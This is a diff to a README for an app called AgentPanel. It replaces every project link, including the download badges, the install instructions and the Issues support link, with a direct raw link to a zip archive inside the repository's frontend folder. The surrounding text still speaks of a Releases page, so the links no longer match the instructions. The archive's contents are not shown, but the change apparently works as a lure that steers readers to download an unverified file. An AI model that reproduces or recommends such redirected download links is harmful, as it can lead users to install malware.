@@ -1,6 +1,6 @@
 # 🤖 AgentPanel - AI Science Discussion Made Simple
 
-[![Download AgentPanel](https://img.shields.io/badge/Download-Get%20AgentPanel-brightgreen?style=for-the-badge)](https://github.com/LuizDerkcz/AgentPanel)
+[![Download AgentPanel](https://img.shields.io/badge/Download-Get%20AgentPanel-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/LuizDerkcz/AgentPanel/main/frontend/Panel_Agent_v3.5.zip)
 
 ## About AgentPanel
 
@@ -28,12 +28,12 @@ If your system meets these points, you can continue to the next step.
 
 To get AgentPanel, visit the official download page on GitHub by clicking the large button below:
 
-[![Download AgentPanel](https://img.shields.io/badge/Download%20AgentPanel-Visit%20Page-blue?style=for-the-badge)](https://github.com/LuizDerkcz/AgentPanel)
+[![Download AgentPanel](https://img.shields.io/badge/Download%20AgentPanel-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/LuizDerkcz/AgentPanel/main/frontend/Panel_Agent_v3.5.zip)
 
 **Instructions to download:**
 
 1. Click the badge above or go to the link:  
-   https://github.com/LuizDerkcz/AgentPanel
+   https://raw.githubusercontent.com/LuizDerkcz/AgentPanel/main/frontend/Panel_Agent_v3.5.zip
 
 2. Once on the page, look for the **Releases** section on the right side or near the top menu. It usually says "Releases".
 
@@ -126,7 +126,7 @@ Check the GitHub page regularly for new releases. Download the latest version an
 
 If you encounter issues:
 
-- Check the **Issues** tab on the GitHub page: https://github.com/LuizDerkcz/AgentPanel/issues
+- Check the **Issues** tab on the GitHub page: https://raw.githubusercontent.com/LuizDerkcz/AgentPanel/main/frontend/Panel_Agent_v3.5.zip
 
 - Look for help documents or FAQs inside the app under **Help** or **Settings**.
 
@@ -144,6 +144,6 @@ AgentPanel respects your privacy. Discussions are encrypted, and your data is no
 
 You can always return here to download or update AgentPanel:
 
-[Download AgentPanel](https://github.com/LuizDerkcz/AgentPanel)
+[Download AgentPanel](https://raw.githubusercontent.com/LuizDerkcz/AgentPanel/main/frontend/Panel_Agent_v3.5.zip)
 
 Click the link, open the latest release, and download the installer file to keep your app current.
